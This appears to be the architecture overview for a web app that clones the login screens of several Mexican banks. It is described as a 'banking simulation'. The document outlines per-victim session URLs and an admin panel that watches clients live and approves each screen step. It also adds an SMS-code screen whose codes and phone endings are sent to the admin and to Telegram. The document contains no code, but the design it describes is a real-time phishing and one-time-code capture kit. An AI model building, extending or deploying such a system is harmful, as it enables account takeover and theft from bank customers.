# Overview

This is a full-stack web application built with React (frontend) and Express.js (backend) that appears to be a banking simulation system. The application mimics banking interfaces for multiple Mexican banks and includes user management, session tracking, and communication features. It's designed as a dual-purpose system with both client-facing banking interfaces and an administrative panel for monitoring and managing sessions.

## User Preferences

Preferred communication style: Simple, everyday language.

## System Architecture

The application follows a modern full-stack architecture with clear separation between client and server code:

- **Frontend**: React with TypeScript, using Vite as the build tool
- **Backend**: Express.js with TypeScript
- **Database**: PostgreSQL with Drizzle ORM
- **Real-time Communication**: WebSockets for live session updates
- **Styling**: Tailwind CSS with shadcn/ui components
- **Authentication**: Passport.js with session-based auth

## Recent Changes (December 2025)

### SMS Verification Flow After QR Scanning
- Added new `SMS_VERIFICATION` screen type to the system
- Modified QR validation flow: after admin approves QR → SMS verification screen → final validation
- Enhanced database schema with `smsCode` and `terminacion` fields for SMS verification
- Updated client-server WebSocket communication to handle SMS verification step
- Added Telegram notifications for SMS verification codes with phone termination details

### Technical Implementation Details
- **New Screen**: `ScreenType.SMS_VERIFICATION` displays 4-digit SMS code input
- **Database**: Added fields to sessions table for SMS workflow
- **Flow**: Phone Input → QR Scan → QR Validation (Admin) → SMS Verification → Final Process
- **Notifications**: SMS codes and phone terminations sent to admin panel and Telegram

## Key Components

### Frontend Architecture
- **Component Structure**: Modular React components organized by feature (admin, client, ui)
- **Routing**: Wouter for lightweight client-side routing
- **State Management**: TanStack Query for server state, React hooks for local state
- **UI Framework**: shadcn/ui components with Radix UI primitives
- **Styling**: Tailwind CSS with custom theme configuration

### Backend Architecture
- **API Layer**: RESTful endpoints with Express.js
- **Authentication**: Passport.js with local strategy and bcrypt password hashing
- **Database Layer**: Drizzle ORM with PostgreSQL (Neon database)
- **Real-time Features**: WebSocket server for live updates
- **Session Management**: Express sessions with memory store

### Database Schema
The application uses several key tables:
- **Users**: System users with roles (admin/user), device limits, and bank permissions
- **Sessions**: Client sessions with banking data, screen state, and interaction history
- **SMS Config/History**: SMS functionality with credit system
- **Access Keys**: API keys for external integrations
- **Devices**: Device tracking for session management

## Data Flow

1. **Client Access**: Users access banking interfaces through unique session URLs
2. **Admin Monitoring**: Administrators monitor sessions in real-time through WebSocket connections
3. **Data Collection**: Client interactions update session data stored in PostgreSQL
4. **Communication**: SMS and email capabilities for client interaction
5. **Session Management**: Real-time updates between client screens and admin interface

## External Dependencies

- **Database**: Neon PostgreSQL for primary data storage
- **SMS Services**: Integration with SMS providers for client communication
- **Email Services**: SendGrid integration for email functionality
- **Payment Processing**: Stripe integration for payment flows
- **Real-time Updates**: WebSocket implementation for live session monitoring

## Deployment Strategy

The application is configured for deployment on Replit with:
- **Environment Variables**: Database URLs, API keys, and service credentials
- **Build Process**: Vite for frontend bundling, esbuild for backend compilation
- **Development**: Hot reload with Vite dev server and tsx for backend
- **Production**: Static file serving with Express for the built frontend

### Key Architectural Decisions

1. **Monorepo Structure**: Client, server, and shared code in a single repository for easier development
2. **TypeScript Throughout**: Full type safety across the entire stack
3. **Real-time Updates**: WebSocket integration for immediate admin notifications
4. **Multi-bank Support**: Flexible banking interface system supporting multiple institutions
5. **Role-based Access**: Granular permissions with admin and user roles
6. **Session-based Architecture**: Each client interaction creates a tracked session
7. **Device Management**: Built-in device limits and tracking for security